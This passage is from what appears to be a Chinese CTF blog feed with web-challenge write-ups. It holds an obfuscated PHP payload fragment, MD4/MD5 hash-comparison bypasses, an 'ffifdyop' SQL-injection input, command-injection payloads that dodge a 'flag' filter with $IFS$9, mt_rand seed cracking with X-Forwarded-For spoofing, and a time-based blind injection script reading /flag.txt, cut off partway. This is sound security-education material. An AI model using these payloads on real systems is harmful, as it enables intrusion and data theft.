uot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;);$___&#x3D;$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;!&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.&quot; &quot;.&quot;&#x2F;&quot;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;!&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;;$__($___);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><img src="/2020/09/05/DASAugust/7.png" class=""><p>通过这道题提供了新思路，之后碰到类似的也可以尝试类似的方法</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;安恒大学&quot;&gt;&lt;a href=&quot;#安恒大学&quot; class=&quot;headerlink&quot; title=&quot;安恒大学&quot;&gt;&lt;/a&gt;安恒大学
    
    </summary>
    
    
    
      <category term="DAS" scheme="http://yoursite.com/tags/DAS/"/>
    
  </entry>
  
  <entry>
    <title>强网杯</title>
    <link href="http://yoursite.com/2020/08/29/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    <id>http://yoursite.com/2020/08/29/%E5%BC%BA%E7%BD%91%E6%9D%AF/</id>
    <published>2020-08-29T02:18:36.000Z</published>
    <updated>2020-08-29T03:17:24.624Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言<a id="more"></a></h2><p>强网先锋的web还好，单独分类的web太难了，是自己太菜了…</p><h1 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h1><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>md4碰撞</li><li>MD5绕过</li><li>sql注入中的md5</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"hash1"</span>] != hash(<span class="string">"md4"</span>, $_GET[<span class="string">"hash1"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 1 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'hash2'</span>] === $_GET[<span class="string">'hash3'</span>] || md5($_GET[<span class="string">'hash2'</span>]) !== md5($_GET[<span class="string">'hash3'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 2 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">"SELECT * FROM flag WHERE password = '"</span> . md5($_GET[<span class="string">"hash4"</span>],<span class="keyword">true</span>) . <span class="string">"'"</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>LEVEL1</p><p>找文章<a href="https://crdx.org/post/hsctf-2019-md5-minus-minus" target="_blank" rel="noopener">https://crdx.org/post/hsctf-2019-md5-minus-minus</a></p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$i = <span class="number">0</span>;</span><br><span class="line">$c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((++$c % <span class="number">1000000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        printf(<span class="string">"."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n = <span class="string">"0e"</span> . $i++;</span><br><span class="line">    $h = hash(<span class="string">'md4'</span>, $n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($n == $h) &#123;</span><br><span class="line">        printf(<span class="string">"\nFound: $n\n"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#Found: 0e251288019</span></span><br></pre></td></tr></table></figure><p>LEVEL2</p><p>这一步很简单数组绕过即可</p><p>LEVEL3</p><p>要让<code>&quot;.md5($pass,true).&quot;</code>为true</p><p>这篇文章叙述详细<a href="https://www.pianshen.com/article/789754585/" target="_blank" rel="noopener">https://www.pianshen.com/article/789754585/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>;;) &#123; </span><br><span class="line"> <span class="keyword">for</span> ($c = <span class="number">0</span>; $c &lt; <span class="number">1000000</span>; $c++, $i++)</span><br><span class="line">  <span class="keyword">if</span> (stripos(md5($i, <span class="keyword">true</span>), <span class="string">'\'or\''</span>) !== <span class="keyword">false</span>)</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"\nmd5($i) = "</span> . md5($i, <span class="keyword">true</span>) . <span class="string">"\n"</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#content: ffifdyop</span></span><br><span class="line"><span class="comment">#hex: 276f722736c95d99e921722cf9ed621c</span></span><br><span class="line"><span class="comment">#raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span></span><br><span class="line"><span class="comment">#string: 'or'6]!r,b</span></span><br></pre></td></tr></table></figure><p>最后的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash1&#x3D;0e251288019&amp;hash2[]&#x3D;1&amp;hash3[]&#x3D;2&amp;hash4&#x3D;ffifdyop</span><br></pre></td></tr></table></figure><img src="/2020/08/29/%E5%BC%BA%E7%BD%91%E6%9D%AF/1.png" class=""><h2 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>绕过flag过滤</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/i"</span>, $_GET[<span class="string">"ip"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ping -c 3 $_GET[ip]"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1|ls</span><br></pre></td></tr></table></figure><p>看一下当前目录文件，flag.php和index.php</p><p>用之前遇到过的题目的payload即可，$IFS$9绕过空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;ca\t$IFS$9fla$a.php</span><br></pre></td></tr></table></figure><p>环境关了，就挂不了出flag的图了</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言
    
    </summary>
    
    
    
      <category term="强网杯" scheme="http://yoursite.com/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>钓鱼城杯</title>
    <link href="http://yoursite.com/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/"/>
    <id>http://yoursite.com/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/</id>
    <published>2020-08-27T14:20:11.000Z</published>
    <updated>2020-08-27T16:28:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言<a id="more"></a></h2><p>web pwn太顶了orz，不会，还有一题根本没思路…</p><p>只能说这有奖金的比赛py很严重，最后1分钟团队狂掉名次…</p><p>自己太菜了，没啥输出，拖后腿了…</p><h2 id="easyseed"><a href="#easyseed" class="headerlink" title="easyseed"></a><strong>easyseed</strong></h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>mt_rand</li><li>php_mt_rand爆破种子</li><li>XFF</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开始一个弹窗，提示不是主人，开始没在意，后面吃大亏…</p><p>index.bak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*************************</span><br><span class="line">$lock &#x3D; random(6, &#39;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#39;);</span><br><span class="line">$key &#x3D; random(16, &#39;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#39;);</span><br><span class="line"></span><br><span class="line">function random($length, $chars &#x3D; &#39;0123456789ABC&#39;) &#123;</span><br><span class="line">    $hash &#x3D; &#39;&#39;;</span><br><span class="line">    $max &#x3D; strlen($chars) - 1;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .&#x3D; $chars[mt_rand(0, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    return $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很熟悉，题目本身也说了是seed，先转换一下，公钥在cookie种可以看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">"abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">"vEUHaY"</span>; <span class="comment">//公钥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str2) ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str1) ; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( str2[i] == str1[j] ) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d %d 0 %d "</span>, j, j, <span class="built_in">strlen</span>(str1)<span class="number">-1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">#<span class="number">21</span> <span class="number">21</span> <span class="number">0</span> <span class="number">51</span> <span class="number">30</span> <span class="number">30</span> <span class="number">0</span> <span class="number">51</span> <span class="number">46</span> <span class="number">46</span> <span class="number">0</span> <span class="number">51</span> <span class="number">33</span> <span class="number">33</span> <span class="number">0</span> <span class="number">51</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">51</span> <span class="number">50</span> <span class="number">50</span> <span class="number">0</span> <span class="number">51</span></span><br></pre></td></tr></table></figure><p>再用<code>php_mt_seed</code>解一下得到种子</p><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/1.png" class=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">718225</span>);</span><br><span class="line">$lock = random(<span class="number">6</span>, <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">'1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line"><span class="keyword">echo</span> $key;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $lock;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'0123456789ABC'</span>)</span> </span>&#123;</span><br><span class="line">$hash = <span class="string">''</span>;</span><br><span class="line">$max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">$hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>重新生成key值，再去替换，但是一直没有用，原因就在开始的提示，要用xff</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://122.112.252.28:20001/'</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">'key'</span>:<span class="string">'nRtqGR8mtd9ZOPyI'</span>,</span><br><span class="line">    <span class="string">'lock'</span>:<span class="string">'vEUHaY'</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'X-Forwarded-For'</span>:<span class="string">'127.0.0.1'</span></span><br><span class="line">&#125;</span><br><span class="line">req = requests.post(url=url,headers=headers,cookies=cookies)</span><br><span class="line">print(req.text)</span><br></pre></td></tr></table></figure><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/2.png" class=""><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a><strong>easyweb</strong></h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>无回显命令注入</li><li>盲注</li><li>linux常用命令——cut</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题什么都没有就一句话，老套路了，抓个包看一下</p><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF/3.png" class=""><p>经过测试命令注入无回显，不知道反弹shell行不行，没有试，队里师傅用的盲注，就用盲注好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import requests</span></span><br><span class="line"><span class="comment"># url = 'http://122.112.252.28:20001/'</span></span><br><span class="line"><span class="comment"># cookies = &#123;</span></span><br><span class="line"><span class="comment">#     'key':'nRtqGR8mtd9ZOPyI',</span></span><br><span class="line"><span class="comment">#     'lock':'vEUHaY'</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># headers = &#123;</span></span><br><span class="line"><span class="comment">#     'X-Forwarded-For':'127.0.0.1'</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># req = requests.post(url=url,headers=headers,cookies=cookies)</span></span><br><span class="line"><span class="comment"># print(req.text)</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">'http://119.3.37.185/'</span></span><br><span class="line">payload = <span class="string">'if [ `cut -c  &#123;num1&#125; /flag.txt` = "&#123;num2&#125;" ];then sleep 2;fi'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">400</span>):</span><br><span class="line">    <span 